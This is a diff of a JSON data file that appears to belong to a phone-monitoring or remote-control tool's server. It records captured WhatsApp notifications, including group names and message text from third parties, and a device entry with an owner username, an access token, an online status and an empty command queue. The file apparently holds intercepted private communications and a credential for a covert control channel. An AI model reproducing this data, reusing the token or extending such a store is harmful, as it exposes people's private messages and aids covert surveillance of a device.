@@ -22,6 +22,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2223 pesan dari 17 chat",
+        "time": "29/04 17:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777454623130
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 𝐕𝟐 (24 pesan): ~ tn||𝟖𝟎𝟖",
         "content": "aku ga when when lagi",
         "time": "29/04 17:34",
@@ -4011,14 +4019,6 @@
         "time": "29/04 17:23",
         "pkg": "com.whatsapp",
         "receivedAt": 1777453956637
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝗣𝗔𝗦𝗨𝗞𝗔𝗡 𝗣𝗘𝗡𝗚𝗛𝗬𝗧𝗔𝗠𝗔𝗡 (42 pesan): ~ who?",
-        "content": "kalau mau jualan di michat aja kak",
-        "time": "29/04 17:23",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777453956585
       }
     ],
     "galleryPhotos": [],
@@ -17821,7 +17821,7 @@
     "deviceName": "HP-ZAL7SEX-9B61",
     "ownerUsername": "Zal7Sex",
     "token": "9b36694f0949493e18d8b3fb4ca882d3",
-    "lastSeen": 1777454619300,
+    "lastSeen": 1777454625300,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T09:21:44.603Z",
